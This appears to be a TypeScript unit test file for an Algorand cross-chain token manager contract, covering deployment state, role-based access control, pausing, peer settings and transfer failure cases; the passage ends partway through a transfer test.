import { algorandFixture } from "@algorandfoundation/algokit-utils/testing";
import type { TransactionSignerAccount } from "@algorandfoundation/algokit-utils/types/account";
import { type Account, type Address, getApplicationAddress } from "algosdk";

import { MockNttTokenClient, MockNttTokenFactory } from "../../specs/client/MockNttToken.client.ts";
import {
  MockTransceiverManagerClient,
  MockTransceiverManagerFactory,
} from "../../specs/client/MockTransceiverManager.client.ts";
import { NttManagerClient, NttManagerFactory, type TrimmedAmount } from "../../specs/client/NttManager.client.ts";
import { OpUpClient, OpUpFactory } from "../../specs/client/OpUp.client.ts";
import {
  getAddressRolesBoxKey,
  getBucketBoxKey,
  getInboundQueuedTransfersBoxKey,
  getMessagesExecutedBoxKey,
  getNttManagerPeerBoxKey,
  getOutboundQueuedTransfersBoxKey,
  getRoleBoxKey,
} from "../utils/boxes.ts";
import {
  getEventBytes,
  getInboundBucketIdBytes,
  getOutboundBucketIdBytes,
  getRandomBytes,
  getRoleBytes,
  useMessageId,
} from "../utils/bytes.ts";
import {
  type TransceiverInstruction,
  calculateMessageDigest,
  getMessageReceived,
  getNttPayload,
  getRandomMessageToSend,
} from "../utils/message.ts";
import { SECONDS_IN_DAY, SECONDS_IN_WEEK, advancePrevBlockTimestamp, getPrevBlockTimestamp } from "../utils/time.ts";
import { MAX_UINT64, bigIntMin, getRandomUInt } from "../utils/uint.ts";

describe("NttManager", () => {
  const localnet = algorandFixture();

  const DEFAULT_ADMIN_ROLE = new Uint8Array(16);
  const RATE_LIMITER_MANAGER_ROLE = getRoleBytes("RATE_LIMITER_MANAGER");
  const UPGRADEABLE_ADMIN_ROLE = getRoleBytes("UPGRADEABLE_ADMIN");
  const NTT_MANAGER_ADMIN_ROLE = getRoleBytes("NTT_MANAGER_ADMIN");
  const PAUSER_ROLE = getRoleBytes("PAUSER");
  const UNPAUSER_ROLE = getRoleBytes("UNPAUSER");

  const MIN_UPGRADE_DELAY = SECONDS_IN_DAY;

  const TOTAL = 50_000_000_000_000n;
  const DECIMALS = 6;
  const ASSET_NAME = "Folks Finance";
  const UNIT_NAME = "FOLKS";
  const URL = "https://folks.finance";
  const METADATA_HASH = getRandomBytes(32);

  let opUpFactory: OpUpFactory;
  let opUpClient: OpUpClient;
  let opUpAppId: bigint;

  let nttTokenFactory: MockNttTokenFactory;
  let nttTokenClient: MockNttTokenClient;
  let nttTokenAppId: bigint;

  let transceiverManagerFactory: MockTransceiverManagerFactory;
  let transceiverManagerClient: MockTransceiverManagerClient;
  let transceiverManagerAppId: bigint;

  const THRESHOLD = 2n;
  const SOURCE_CHAIN_ID = 123n;
  const PEER_CHAIN_ID = 56n;
  const PEER_CONTRACT = getRandomBytes(32);
  const PEER_DECIMALS = 2;

  const OUTBOUND_LIMIT = BigInt(5e6);
  const OUTBOUND_DURATION = SECONDS_IN_WEEK;
  const INBOUND_LIMIT = BigInt(1e6);
  const INBOUND_DURATION = SECONDS_IN_DAY;

  const TOTAL_DELIVERY_PRICE = 250_000n;

  let factory: NttManagerFactory;
  let client: NttManagerClient;
  let appId: bigint;
  let assetId: bigint;
  let fakeAssetId: bigint;

  let creator: Address & Account & TransactionSignerAccount;
  let admin: Address & Account & TransactionSignerAccount;
  let pauser: Address & Account & TransactionSignerAccount;
  let unpauser: Address & Account & TransactionSignerAccount;
  let user: Address & Account & TransactionSignerAccount;
  let relayer: Address & Account & TransactionSignerAccount;

  beforeAll(async () => {
    await localnet.newScope();
    const { algorand, generateAccount } = localnet.context;

    creator = await generateAccount({ initialFunds: (100).algo() });
    admin = await generateAccount({ initialFunds: (100).algo() });
    pauser = await generateAccount({ initialFunds: (100).algo() });
    unpauser = await generateAccount({ initialFunds: (100).algo() });
    user = await generateAccount({ initialFunds: (100).algo() });
    relayer = await generateAccount({ initialFunds: (100).algo() });

    factory = algorand.client.getTypedAppFactory(NttManagerFactory, {
      defaultSender: creator,
      defaultSigner: creator.signer,
    });

    // deploy op up
    {
      opUpFactory = localnet.algorand.client.getTypedAppFactory(OpUpFactory, {
        defaultSender: creator,
        defaultSigner: creator.signer,
      });
      const { appClient, result } = await opUpFactory.deploy();
      opUpAppId = result.appId;
      opUpClient = appClient;

      expect(opUpAppId).not.toEqual(0n);
    }

    // create asset
    {
      const res = await localnet.algorand.send.assetCreate({
        sender: creator,
        total: TOTAL,
        decimals: DECIMALS,
        assetName: ASSET_NAME,
        unitName: UNIT_NAME,
        url: URL,
        metadataHash: METADATA_HASH,
      });
      assetId = res.assetId;
    }

    // create fake asset
    {
      const res = await localnet.algorand.send.assetCreate({
        sender: creator,
        total: TOTAL,
        decimals: DECIMALS,
        assetName: ASSET_NAME,
        unitName: UNIT_NAME,
        url: URL,
        metadataHash: METADATA_HASH,
      });
      fakeAssetId = res.assetId;
    }

    // deploy ntt token
    {
      nttTokenFactory = algorand.client.getTypedAppFactory(MockNttTokenFactory, {
        defaultSender: creator,
        defaultSigner: creator.signer,
      });
      const { appClient, result } = await nttTokenFactory.deploy();
      nttTokenAppId = result.appId;
      nttTokenClient = appClient;

      expect(nttTokenAppId).not.toEqual(0n);
    }

    // opt ntt token into asa
    {
      const APP_MIN_BALANCE = (200_000).microAlgos();
      const fundingTxn = await localnet.algorand.createTransaction.payment({
        sender: creator,
        receiver: getApplicationAddress(nttTokenAppId),
        amount: APP_MIN_BALANCE,
      });
      await nttTokenClient
        .newGroup()
        .addTransaction(fundingTxn)
        .setAssetId({
          args: [assetId],
          extraFee: (1000).microAlgos(),
          assetReferences: [assetId],
        })
        .send();

      expect(await nttTokenClient.getAssetId()).toEqual(assetId);
    }

    // opt user into asset and fund
    await localnet.algorand.send.assetOptIn({ sender: user, assetId });
    await localnet.algorand.send.assetTransfer({ sender: creator, receiver: user, assetId, amount: BigInt(100e6) });

    // deploy transceiver manager
    {
      transceiverManagerFactory = algorand.client.getTypedAppFactory(MockTransceiverManagerFactory, {
        defaultSender: creator,
        defaultSigner: creator.signer,
      });
      const { appClient, result } = await transceiverManagerFactory.deploy();
      transceiverManagerAppId = result.appId;
      transceiverManagerClient = appClient;

      expect(transceiverManagerAppId).not.toEqual(0n);
    }

    // set total delivery price
    {
      await transceiverManagerClient.send.setTotalDeliveryPrice({ args: [TOTAL_DELIVERY_PRICE] });
      expect(await transceiverManagerClient.state.global._totalDeliveryPrice()).toEqual(TOTAL_DELIVERY_PRICE);
    }
  }, 20_000);

  test("deploys with correct state", async () => {
    const { appClient, result } = await factory.deploy({
      createParams: {
        sender: creator,
        method: "create",
        args: [nttTokenAppId, SOURCE_CHAIN_ID, THRESHOLD, MIN_UPGRADE_DELAY],
        extraFee: (1000).microAlgos(),
      },
    });
    appId = result.appId;
    client = appClient;

    expect(appId).not.toEqual(0n);
    expect(await client.state.global.isInitialised()).toBeFalsy();
    expect(await client.state.global.minUpgradeDelay()).toEqual({
      delay_0: 0n,
      delay_1: MIN_UPGRADE_DELAY,
      timestamp: 0n,
    });
    expect(await client.getActiveMinUpgradeDelay()).toEqual(MIN_UPGRADE_DELAY);
    expect(await client.state.global.scheduledContractUpgrade()).toBeUndefined();
    expect(await client.state.global.version()).toEqual(1n);
    expect(await client.state.global.transceiverManager()).toEqual(undefined);
    expect(await client.state.global.threshold()).toEqual(THRESHOLD);
    expect(await client.state.global.isPaused()).toBeFalsy();
    expect(await client.state.global.assetId()).toEqual(assetId);
    expect(await client.state.global.nttToken()).toEqual(nttTokenAppId);
    expect(await client.state.global.messageSequence()).toEqual(0n);
    expect(await client.state.global.chainId()).toEqual(SOURCE_CHAIN_ID);

    expect(Uint8Array.from(await client.defaultAdminRole())).toEqual(DEFAULT_ADMIN_ROLE);
    expect(Uint8Array.from(await client.getRoleAdmin({ args: [DEFAULT_ADMIN_ROLE] }))).toEqual(DEFAULT_ADMIN_ROLE);
    expect(Uint8Array.from(await client.rateLimiterManagerRole())).toEqual(RATE_LIMITER_MANAGER_ROLE);
    expect(Uint8Array.from(await client.getRoleAdmin({ args: [RATE_LIMITER_MANAGER_ROLE] }))).toEqual(
      DEFAULT_ADMIN_ROLE,
    );
    expect(Uint8Array.from(await client.upgradableAdminRole())).toEqual(UPGRADEABLE_ADMIN_ROLE);
    expect(Uint8Array.from(await client.getRoleAdmin({ args: [UPGRADEABLE_ADMIN_ROLE] }))).toEqual(DEFAULT_ADMIN_ROLE);
    expect(Uint8Array.from(await client.nttManagerAdminRole())).toEqual(NTT_MANAGER_ADMIN_ROLE);
    expect(Uint8Array.from(await client.getRoleAdmin({ args: [NTT_MANAGER_ADMIN_ROLE] }))).toEqual(DEFAULT_ADMIN_ROLE);
    expect(Uint8Array.from(await client.pauserRole())).toEqual(PAUSER_ROLE);
    expect(Uint8Array.from(await client.getRoleAdmin({ args: [PAUSER_ROLE] }))).toEqual(DEFAULT_ADMIN_ROLE);
    expect(Uint8Array.from(await client.unpauserRole())).toEqual(UNPAUSER_ROLE);
    expect(Uint8Array.from(await client.getRoleAdmin({ args: [UNPAUSER_ROLE] }))).toEqual(DEFAULT_ADMIN_ROLE);

    expect((result as any).confirmations[0].innerTxns!.length).toEqual(1);
  });

  test("get ntt manager peer fails if chain unknown", async () => {
    await expect(client.send.getNttManagerPeer({ args: [PEER_CHAIN_ID] })).rejects.toThrow("Unknown peer chain");
  });

  describe("when uninitialised", () => {
    afterAll(async () => {
      const bucketId = getOutboundBucketIdBytes();

      // setup outbound rate limit
      await client.send.setOutboundRateLimit({
        sender: admin,
        args: [OUTBOUND_LIMIT],
        boxReferences: [
          getRoleBoxKey(RATE_LIMITER_MANAGER_ROLE),
          getAddressRolesBoxKey(RATE_LIMITER_MANAGER_ROLE, admin.publicKey),
          getBucketBoxKey(bucketId),
        ],
      });
      expect(await client.getRateLimit({ args: [bucketId] })).toEqual(OUTBOUND_LIMIT);

      // setup outbound rate duration
      await client.send.setOutboundRateDuration({
        sender: admin,
        args: [OUTBOUND_DURATION],
        boxReferences: [
          getRoleBoxKey(RATE_LIMITER_MANAGER_ROLE),
          getAddressRolesBoxKey(RATE_LIMITER_MANAGER_ROLE, admin.publicKey),
          getBucketBoxKey(bucketId),
        ],
      });
      expect(await client.getRateDuration({ args: [bucketId] })).toEqual(OUTBOUND_DURATION);
    });

    test("fails to pause", async () => {
      await expect(
        client.send.pause({
          sender: admin,
          args: [],
        }),
      ).rejects.toThrow("Uninitialised contract");
    });

    test("fails to unpause", async () => {
      await expect(
        client.send.pause({
          sender: admin,
          args: [],
        }),
      ).rejects.toThrow("Uninitialised contract");
    });

    test("fails to set transceiver manager", async () => {
      await expect(
        client.send.setTransceiverManager({
          sender: admin,
          args: [admin.toString(), transceiverManagerAppId],
          appReferences: [transceiverManagerAppId],
        }),
      ).rejects.toThrow("Uninitialised contract");
    });

    test("fails to set threshold", async () => {
      await expect(client.send.setThreshold({ sender: admin, args: [THRESHOLD] })).rejects.toThrow(
        "Uninitialised contract",
      );
    });

    test("fails to set ntt manager peer", async () => {
      await expect(
        client.send.setNttManagerPeer({ sender: admin, args: [PEER_CHAIN_ID, PEER_CONTRACT, PEER_DECIMALS] }),
      ).rejects.toThrow("Uninitialised contract");
    });

    test("fails to transfer (simple)", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: 0n,
      });
      await expect(
        client.send.transfer({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, 0n, PEER_CHAIN_ID, getRandomBytes(32)],
        }),
      ).rejects.toThrow("Uninitialised contract");
    });

    test("fails to transfer (full)", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: 0n,
      });
      await expect(
        client.send.transferFull({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, 0n, PEER_CHAIN_ID, getRandomBytes(32), false, []],
        }),
      ).rejects.toThrow("Uninitialised contract");
    });

    test("fails to complete outbound queued transfer", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      await expect(
        client.send.completeOutboundQueuedTransfer({
          sender: user,
          args: [feePaymentTxn, getRandomBytes(32)],
        }),
      ).rejects.toThrow("Uninitialised contract");
    });

    test("fails to cancel outbound queued transfer", async () => {
      await expect(
        client.send.cancelOutboundQueuedTransfer({
          sender: user,
          args: [getRandomBytes(32)],
        }),
      ).rejects.toThrow("Uninitialised contract");
    });

    test("fails to complete inbound queued transfer", async () => {
      await expect(
        client.send.completeInboundQueuedTransfer({
          sender: user,
          args: [getRandomBytes(32)],
        }),
      ).rejects.toThrow("Uninitialised contract");
    });

    test("succeeds to initialise and sets correct state", async () => {
      const APP_MIN_BALANCE = (265_700).microAlgos();
      const fundingTxn = await localnet.algorand.createTransaction.payment({
        sender: creator,
        receiver: getApplicationAddress(appId),
        amount: APP_MIN_BALANCE,
      });

      const bucketId = getOutboundBucketIdBytes();

      const {
        transactions: [opUpTxn],
      } = await opUpClient.createTransaction.ensureBudget({
        sender: admin,
        args: [3000],
        extraFee: (3000).microAlgos(),
      });

      const res = await client
        .newGroup()
        .addTransaction(opUpTxn)
        .addTransaction(fundingTxn)
        .initialise({
          args: [admin.toString(), transceiverManagerAppId],
          appReferences: [transceiverManagerAppId],
          boxReferences: [
            getRoleBoxKey(DEFAULT_ADMIN_ROLE),
            getAddressRolesBoxKey(DEFAULT_ADMIN_ROLE, admin.publicKey),
            getRoleBoxKey(RATE_LIMITER_MANAGER_ROLE),
            getAddressRolesBoxKey(RATE_LIMITER_MANAGER_ROLE, admin.publicKey),
            getBucketBoxKey(bucketId),
          ],
          extraFee: (1000).microAlgos(),
        })
        .send();

      expect(await client.state.global.isInitialised()).toBeTruthy();
      expect(await client.state.global.transceiverManager()).toEqual(transceiverManagerAppId);

      expect(await client.hasRole({ args: [DEFAULT_ADMIN_ROLE, admin.toString()] })).toBeTruthy();
      expect(await client.hasRole({ args: [RATE_LIMITER_MANAGER_ROLE, admin.toString()] })).toBeTruthy();
      expect(await client.hasRole({ args: [UPGRADEABLE_ADMIN_ROLE, admin.toString()] })).toBeTruthy();
      expect(await client.hasRole({ args: [NTT_MANAGER_ADMIN_ROLE, admin.toString()] })).toBeTruthy();

      expect(res.confirmations[2].logs![0]).toEqual(
        getEventBytes("BucketAdded(byte[32],uint256,uint64)", [bucketId, 0n, 0n]),
      );

      expect(res.confirmations[2].innerTxns!.length).toEqual(1);
      expect(res.confirmations[2].innerTxns![0].logs![0]).toEqual(
        getEventBytes("MessageHandlerAdded(uint64,address)", [appId, admin.toString()]),
      );
    });
  });

  describe("pause and unpause", () => {
    beforeAll(async () => {
      const APP_MIN_BALANCE = (55_400).microAlgos();
      const fundingTxn = await localnet.algorand.createTransaction.payment({
        sender: creator,
        receiver: getApplicationAddress(appId),
        amount: APP_MIN_BALANCE,
      });
      await client
        .newGroup()
        .addTransaction(fundingTxn)
        .grantRole({
          sender: admin,
          args: [PAUSER_ROLE, pauser.toString()],
          boxReferences: [
            getRoleBoxKey(PAUSER_ROLE),
            getAddressRolesBoxKey(PAUSER_ROLE, pauser.publicKey),
            getAddressRolesBoxKey(DEFAULT_ADMIN_ROLE, admin.publicKey),
          ],
        })
        .grantRole({
          sender: admin,
          args: [UNPAUSER_ROLE, unpauser.toString()],
          boxReferences: [
            getRoleBoxKey(UNPAUSER_ROLE),
            getAddressRolesBoxKey(UNPAUSER_ROLE, unpauser.publicKey),
            getAddressRolesBoxKey(DEFAULT_ADMIN_ROLE, admin.publicKey),
          ],
        })
        .send();
      expect(await client.hasRole({ args: [PAUSER_ROLE, pauser.toString()] })).toBeTruthy();
      expect(await client.hasRole({ args: [UNPAUSER_ROLE, unpauser.toString()] })).toBeTruthy();
    });

    test("pause fails when caller is not pauser", async () => {
      await expect(
        client.send.pause({
          sender: user,
          args: [],
          boxReferences: [getRoleBoxKey(PAUSER_ROLE), getAddressRolesBoxKey(PAUSER_ROLE, user.publicKey)],
        }),
      ).rejects.toThrow("Access control unauthorised account");
    });

    test("unpause fails when caller is not unpauser", async () => {
      await expect(
        client.send.unpause({
          sender: user,
          args: [],
          boxReferences: [getRoleBoxKey(UNPAUSER_ROLE), getAddressRolesBoxKey(UNPAUSER_ROLE, user.publicKey)],
        }),
      ).rejects.toThrow("Access control unauthorised account");
    });

    test("unpause fails when not paused", async () => {
      await expect(
        client.send.unpause({
          sender: unpauser,
          args: [],
          boxReferences: [getRoleBoxKey(UNPAUSER_ROLE), getAddressRolesBoxKey(UNPAUSER_ROLE, unpauser.publicKey)],
        }),
      ).rejects.toThrow("Contract is not paused");
    });

    test("pause succeeds", async () => {
      const res = await client.send.pause({
        sender: pauser,
        args: [],
        boxReferences: [getRoleBoxKey(PAUSER_ROLE), getAddressRolesBoxKey(PAUSER_ROLE, pauser.publicKey)],
      });
      expect(await client.state.global.isPaused()).toBeTruthy();
      expect(res.confirmations[0].logs![0]).toEqual(getEventBytes("Paused(bool)", [true]));
    });

    test("pause fails when already paused", async () => {
      await expect(
        client.send.pause({
          sender: pauser,
          args: [],
          boxReferences: [getRoleBoxKey(PAUSER_ROLE), getAddressRolesBoxKey(PAUSER_ROLE, pauser.publicKey)],
        }),
      ).rejects.toThrow("Contract is paused");
    });

    test("unpause succeeds", async () => {
      const res = await client.send.unpause({
        sender: unpauser,
        args: [],
        boxReferences: [getRoleBoxKey(UNPAUSER_ROLE), getAddressRolesBoxKey(UNPAUSER_ROLE, unpauser.publicKey)],
      });
      expect(await client.state.global.isPaused()).toBeFalsy();
      expect(res.confirmations[0].logs![0]).toEqual(getEventBytes("Paused(bool)", [false]));
    });
  });

  describe("when paused", () => {
    beforeAll(async () => {
      const isPaused = await client.state.global.isPaused();
      if (!isPaused) {
        await client.send.pause({
          sender: pauser,
          args: [],
          boxReferences: [getRoleBoxKey(PAUSER_ROLE), getAddressRolesBoxKey(PAUSER_ROLE, pauser.publicKey)],
        });
      }
    });

    afterAll(async () => {
      const isPaused = await client.state.global.isPaused();
      if (isPaused) {
        await client.send.unpause({
          sender: unpauser,
          args: [],
          boxReferences: [getRoleBoxKey(UNPAUSER_ROLE), getAddressRolesBoxKey(UNPAUSER_ROLE, unpauser.publicKey)],
        });
      }
    });

    test("fails to transfer (simple)", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: 0n,
      });
      await expect(
        client.send.transfer({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, 0n, PEER_CHAIN_ID, getRandomBytes(32)],
        }),
      ).rejects.toThrow("Contract is paused");
    });

    test("fails to transfer (full)", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: 0n,
      });
      await expect(
        client.send.transferFull({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, 0n, PEER_CHAIN_ID, getRandomBytes(32), false, []],
        }),
      ).rejects.toThrow("Contract is paused");
    });

    test("fails to complete outbound queued transfer", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      await expect(
        client.send.completeOutboundQueuedTransfer({
          sender: user,
          args: [feePaymentTxn, getRandomBytes(32)],
        }),
      ).rejects.toThrow("Contract is paused");
    });

    test("fails to cancel outbound queued transfer", async () => {
      await expect(
        client.send.cancelOutboundQueuedTransfer({
          sender: user,
          args: [getRandomBytes(32)],
        }),
      ).rejects.toThrow("Contract is paused");
    });

    test("fails to complete inbound queued transfer", async () => {
      await expect(
        client.send.completeInboundQueuedTransfer({
          sender: user,
          args: [getRandomBytes(32)],
        }),
      ).rejects.toThrow("Contract is paused");
    });

    // handle message when paused tested later
  });

  describe("set transceiver manager", () => {
    test("fails when caller is not ntt manager admin", async () => {
      await expect(
        client.send.setTransceiverManager({
          sender: user,
          args: [admin.toString(), transceiverManagerAppId],
          appReferences: [transceiverManagerAppId],
          boxReferences: [
            getRoleBoxKey(NTT_MANAGER_ADMIN_ROLE),
            getAddressRolesBoxKey(NTT_MANAGER_ADMIN_ROLE, user.publicKey),
          ],
        }),
      ).rejects.toThrow("Access control unauthorised account");
    });

    test("succeeds", async () => {
      // deploy another transceiver manager
      const { result } = await transceiverManagerFactory.send.create.bare({ sender: creator });
      const { appId: tempAppId } = result;
      expect(tempAppId).not.toEqual(transceiverManagerAppId);

      // set transceiver manager
      const res = await client.send.setTransceiverManager({
        sender: admin,
        args: [user.toString(), tempAppId],
        appReferences: [tempAppId],
        boxReferences: [
          getRoleBoxKey(NTT_MANAGER_ADMIN_ROLE),
          getAddressRolesBoxKey(NTT_MANAGER_ADMIN_ROLE, admin.publicKey),
        ],
        extraFee: (1000).microAlgos(),
      });
      expect(await client.state.global.transceiverManager()).toEqual(tempAppId);

      expect(res.confirmations[0].logs![0]).toEqual(getEventBytes("TransceiverManagerUpdated(uint64)", [tempAppId]));
      expect(res.confirmations[0].innerTxns!.length).toEqual(1);
      expect(res.confirmations[0].innerTxns![0].logs![0]).toEqual(
        getEventBytes("MessageHandlerAdded(uint64,address)", [appId, user.toString()]),
      );

      // restore
      await client.send.setTransceiverManager({
        sender: admin,
        args: [admin.toString(), transceiverManagerAppId],
        appReferences: [transceiverManagerAppId],
        boxReferences: [
          getRoleBoxKey(NTT_MANAGER_ADMIN_ROLE),
          getAddressRolesBoxKey(NTT_MANAGER_ADMIN_ROLE, admin.publicKey),
        ],
        extraFee: (1000).microAlgos(),
      });
      expect(await client.state.global.transceiverManager()).toEqual(transceiverManagerAppId);
    });
  });

  describe("set threshold", () => {
    test("fails when caller is not ntt manager admin", async () => {
      await expect(
        client.send.setThreshold({
          sender: user,
          args: [0],
          boxReferences: [
            getRoleBoxKey(NTT_MANAGER_ADMIN_ROLE),
            getAddressRolesBoxKey(NTT_MANAGER_ADMIN_ROLE, user.publicKey),
          ],
        }),
      ).rejects.toThrow("Access control unauthorised account");
    });

    test("succeeds", async () => {
      const newThreshold = 1n;
      expect(newThreshold).not.toEqual(THRESHOLD);

      // set threshold
      const res = await client.send.setThreshold({
        sender: admin,
        args: [newThreshold],
        boxReferences: [
          getRoleBoxKey(NTT_MANAGER_ADMIN_ROLE),
          getAddressRolesBoxKey(NTT_MANAGER_ADMIN_ROLE, admin.publicKey),
        ],
      });
      expect(res.confirmations[0].logs![0]).toEqual(getEventBytes("ThresholdUpdated(uint64)", [newThreshold]));
      expect(await client.state.global.threshold()).toEqual(newThreshold);

      // restore
      await client.send.setThreshold({
        sender: admin,
        args: [THRESHOLD],
        boxReferences: [
          getRoleBoxKey(NTT_MANAGER_ADMIN_ROLE),
          getAddressRolesBoxKey(NTT_MANAGER_ADMIN_ROLE, admin.publicKey),
        ],
      });
      expect(await client.state.global.threshold()).toEqual(THRESHOLD);
    });
  });

  describe("set ntt manager peer", () => {
    afterAll(async () => {
      const bucketId = getInboundBucketIdBytes(PEER_CHAIN_ID);

      // setup inbound rate limit
      await client.send.setInboundRateLimit({
        sender: admin,
        args: [PEER_CHAIN_ID, INBOUND_LIMIT],
        boxReferences: [
          getRoleBoxKey(RATE_LIMITER_MANAGER_ROLE),
          getAddressRolesBoxKey(RATE_LIMITER_MANAGER_ROLE, admin.publicKey),
          getBucketBoxKey(bucketId),
        ],
      });
      expect(await client.getRateLimit({ args: [bucketId] })).toEqual(INBOUND_LIMIT);

      // setup inbound rate duration
      await client.send.setInboundRateDuration({
        sender: admin,
        args: [PEER_CHAIN_ID, INBOUND_DURATION],
        boxReferences: [
          getRoleBoxKey(RATE_LIMITER_MANAGER_ROLE),
          getAddressRolesBoxKey(RATE_LIMITER_MANAGER_ROLE, admin.publicKey),
          getBucketBoxKey(bucketId),
        ],
      });
      expect(await client.getRateDuration({ args: [bucketId] })).toEqual(INBOUND_DURATION);
    });

    test("fails when caller is not ntt manager admin", async () => {
      await expect(
        client.send.setNttManagerPeer({
          sender: user,
          args: [PEER_CHAIN_ID, PEER_CONTRACT, PEER_DECIMALS],
          boxReferences: [
            getRoleBoxKey(NTT_MANAGER_ADMIN_ROLE),
            getAddressRolesBoxKey(NTT_MANAGER_ADMIN_ROLE, user.publicKey),
          ],
        }),
      ).rejects.toThrow("Access control unauthorised account");
    });

    test("fails when setting itself as peer", async () => {
      await expect(
        client.send.setNttManagerPeer({
          sender: admin,
          args: [SOURCE_CHAIN_ID, PEER_CONTRACT, PEER_DECIMALS],
          boxReferences: [
            getRoleBoxKey(NTT_MANAGER_ADMIN_ROLE),
            getAddressRolesBoxKey(NTT_MANAGER_ADMIN_ROLE, admin.publicKey),
          ],
        }),
      ).rejects.toThrow("Cannot set itself as peer chain");
    });

    test("fails when peer decimals is zero", async () => {
      await expect(
        client.send.setNttManagerPeer({
          sender: admin,
          args: [PEER_CHAIN_ID, PEER_CONTRACT, 0n],
          boxReferences: [
            getRoleBoxKey(NTT_MANAGER_ADMIN_ROLE),
            getAddressRolesBoxKey(NTT_MANAGER_ADMIN_ROLE, admin.publicKey),
          ],
        }),
      ).rejects.toThrow("Invalid peer decimals");
    });

    test("succeeds on first try", async () => {
      const APP_MIN_BALANCE = (78_200).microAlgos();
      const fundingTxn = await localnet.algorand.createTransaction.payment({
        sender: creator,
        receiver: getApplicationAddress(appId),
        amount: APP_MIN_BALANCE,
      });

      const bucketId = getInboundBucketIdBytes(PEER_CHAIN_ID);
      const res = await client
        .newGroup()
        .addTransaction(fundingTxn)
        .setNttManagerPeer({
          sender: admin,
          args: [PEER_CHAIN_ID, PEER_CONTRACT, PEER_DECIMALS],
          boxReferences: [
            getRoleBoxKey(NTT_MANAGER_ADMIN_ROLE),
            getAddressRolesBoxKey(NTT_MANAGER_ADMIN_ROLE, admin.publicKey),
            getNttManagerPeerBoxKey(PEER_CHAIN_ID),
            getBucketBoxKey(bucketId),
          ],
        })
        .send();

      expect(res.confirmations[1].logs![0]).toEqual(
        getEventBytes("BucketAdded(byte[32],uint256,uint64)", [bucketId, 0n, 0n]),
      );
      expect(res.confirmations[1].logs![1]).toEqual(
        getEventBytes("NttManagerPeerSet(uint16,byte[32],uint8,bool)", [
          PEER_CHAIN_ID,
          PEER_CONTRACT,
          PEER_DECIMALS,
          true,
        ]),
      );
      expect(await client.getNttManagerPeer({ args: [PEER_CHAIN_ID] })).toEqual({
        peerContract: PEER_CONTRACT,
        decimals: PEER_DECIMALS,
      });
    });

    test("succeeds on overriding", async () => {
      // override existing ntt manager peer
      const tempPeerContract = getRandomBytes(32);
      const res = await client.send.setNttManagerPeer({
        sender: admin,
        args: [PEER_CHAIN_ID, tempPeerContract, PEER_DECIMALS],
        boxReferences: [
          getRoleBoxKey(NTT_MANAGER_ADMIN_ROLE),
          getAddressRolesBoxKey(NTT_MANAGER_ADMIN_ROLE, admin.publicKey),
          getNttManagerPeerBoxKey(PEER_CHAIN_ID),
        ],
      });
      expect(res.confirmations[0].logs![0]).toEqual(
        getEventBytes("NttManagerPeerSet(uint16,byte[32],uint8,bool)", [
          PEER_CHAIN_ID,
          tempPeerContract,
          PEER_DECIMALS,
          false,
        ]),
      );
      expect(await client.getNttManagerPeer({ args: [PEER_CHAIN_ID] })).toEqual({
        peerContract: tempPeerContract,
        decimals: PEER_DECIMALS,
      });

      // restore
      await client.send.setNttManagerPeer({
        sender: admin,
        args: [PEER_CHAIN_ID, PEER_CONTRACT, PEER_DECIMALS],
        boxReferences: [
          getRoleBoxKey(NTT_MANAGER_ADMIN_ROLE),
          getAddressRolesBoxKey(NTT_MANAGER_ADMIN_ROLE, admin.publicKey),
          getNttManagerPeerBoxKey(PEER_CHAIN_ID),
        ],
      });
      expect(await client.getNttManagerPeer({ args: [PEER_CHAIN_ID] })).toEqual({
        peerContract: PEER_CONTRACT,
        decimals: PEER_DECIMALS,
      });
    });
  });

  describe("transfer", () => {
    test("fails when fee payment receiver isn't contract", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: user,
        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId,
        amount: 0n,
      });
      await expect(
        client.send.transfer({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, 0n, PEER_CHAIN_ID, getRandomBytes(32)],
        }),
      ).rejects.toThrow("Unknown fee payment receiver");
    });

    test("fails when asset is unknown", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
        amount: (0).microAlgo(),
      });
      const sendTokenTxn = await localnet.algorand.createTransaction.assetTransfer({
        sender: user,
        receiver: getApplicationAddress(nttTokenAppId),
        assetId: fakeAssetId,
        amount: 0n,
      });
      await expect(
        client.send.transfer({
          sender: user,
          args: [feePaymentTxn, sendTokenTxn, 0n, PEER_CHAIN_ID, getRandomBytes(32)],
        }),
      ).rejects.toThrow("Unknown asset");
    });

    test("fails when asset receiver isn't contract", async () => {
      const feePaymentTxn = await localnet.algorand.createTransaction.payment({
        sender: user,
        receiver: getApplicationAddress(appId),
